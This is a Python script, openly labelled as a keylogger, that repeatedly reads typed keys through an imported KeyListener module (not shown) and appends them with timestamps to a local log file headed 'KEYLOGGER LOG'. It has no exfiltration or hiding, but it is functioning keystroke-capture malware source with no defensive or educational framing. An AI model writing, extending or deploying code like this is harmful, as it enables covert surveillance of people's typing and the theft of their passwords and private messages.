import os
from datetime import datetime
from key_listener import KeyListener

# --------------------- CONSTANTS --------------------- #

LOGS_DIR = './logs/'
LOG_FILE = 'log.txt'  # Full path to the log file

# --------------------- FUNCTIONS --------------------- #

def write_to_log(message: str, log_name: str) -> bool:
    """
    Writes a message to a log file.

    Args:
        message: The message to be written to the log file.
        log_name: The name of the log file.

    Returns:
        True if the message was successfully written to the log file, False otherwise.
    """
    try:
        log_path = os.path.join(LOGS_DIR, log_name)

        if not os.path.exists(LOGS_DIR):
            os.makedirs(LOGS_DIR)
            print("Directory {LOGS_DIR} created successfully!".format(LOGS_DIR=LOGS_DIR))

        # Create the log file if it doesn't exist
        if not os.path.exists(log_path):
            with open(log_path, 'w') as f:
                f.write('---- KEYLOGGER LOG ----\n')

        with open(log_path, 'a') as f:
            f.write(message)
        
        return True
    except Exception as e:
        print(e)
        return False
    
def format_message(content: str) -> str:
    date = 'DATE -> {}'.format(datetime.today().strftime('%Y-%m-%d %H:%M:%S'))
    sep = '\n# ---------------------------------------------- #\n'

    return '{date}{sep} {content}{sep}\n\n'.format(date=date, content=content, sep=sep)

# --------------------- MAIN --------------------- #

def main():
    while True:
        key_listener = KeyListener()
        typed_keys = key_listener.read_keys()

        message = format_message(typed_keys)
        write_to_log(message, LOG_FILE)

if __name__ == "__main__":
    main()